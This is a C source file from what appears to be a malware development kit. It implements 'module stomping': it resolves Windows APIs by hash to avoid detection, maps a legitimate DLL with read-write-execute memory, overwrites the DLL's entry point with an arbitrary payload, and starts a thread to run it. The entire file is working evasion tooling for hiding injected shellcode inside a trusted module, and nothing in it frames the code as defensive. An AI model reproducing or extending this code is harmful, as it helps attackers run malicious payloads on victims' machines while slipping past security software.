// MDK
// docs    : https://sebafvs.com/mdk/stomp
// author  : @sebafvs

#include <windows.h>
#include "mdk/execution.h"
#include "mdk/memory.h"
#include "mdk/thread.h"
#include "mdk/process.h"
#include "mdk/pe.h"
#include "mdk/evasion.h"
#include "mdk/hashes.h"
#include "mdk/nt.h"

typedef HANDLE(WINAPI* pfnCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

MDK_RESULT mdk_module_stomp(IN const BYTE* payload, IN SIZE_T size, IN LPCWSTR dll_path, OUT HANDLE* thread) {

    pfnCreateFileW create_file = NULL;
    MDK_CHECK(mdk_dfr_resolve(KERNEL32_H, CreateFileW_H, (PVOID*)&create_file));

    HANDLE file_handle = create_file(dll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (file_handle == INVALID_HANDLE_VALUE) return MDK_MAKE_FAIL("CreateFileW", MDK_STATUS_OBJECT_NAME_NOT_FOUND);

    HANDLE section = NULL;
    MDK_RESULT result = mdk_create_section_image(file_handle, &section);
    mdk_close_handle(file_handle);
    if (MDK_FAIL(result)) return result;

    PVOID mapped_base = NULL;
    result = mdk_map(section, (HANDLE)(LONG_PTR)-1, 0, PAGE_EXECUTE_READWRITE, &mapped_base);
    mdk_close_handle(section);
    if (MDK_FAIL(result)) return result;

    PIMAGE_NT_HEADERS nt_headers = mdk_pe_nt(mapped_base);
    if (!nt_headers) { result = MDK_MAKE_FAIL("mdk_pe_nt", MDK_STATUS_INVALID_IMAGE_FORMAT); goto _cleanup; }

    DWORD entry_point_rva = nt_headers->OptionalHeader.AddressOfEntryPoint;
    PVOID entry_point     = (BYTE*)mapped_base + entry_point_rva;

    PIMAGE_SECTION_HEADER text_section = mdk_pe_section_by_rva(mapped_base, entry_point_rva);
    if (!text_section) { result = MDK_MAKE_FAIL("mdk_pe_section_by_rva", MDK_STATUS_NOT_FOUND); goto _cleanup; }

    DWORD  ep_offset_in_section = entry_point_rva - text_section->VirtualAddress;
    SIZE_T available_space      = text_section->Misc.VirtualSize - ep_offset_in_section;

    if (size > available_space) { result = MDK_MAKE_FAIL("mdk_module_stomp:size", MDK_STATUS_INSUFFICIENT_RESOURCES); goto _cleanup; }

    result = mdk_write_exec((HANDLE)-1, entry_point, payload, size);
    if (MDK_FAIL(result)) { goto _cleanup; }

    result = mdk_create_remote_thread((HANDLE)-1, entry_point, NULL, 0, thread);
    if (MDK_FAIL(result)) { goto _cleanup; }

    return MDK_MAKE_OK();

_cleanup:
    mdk_unmap((HANDLE)-1, mapped_base);
    return result;
}
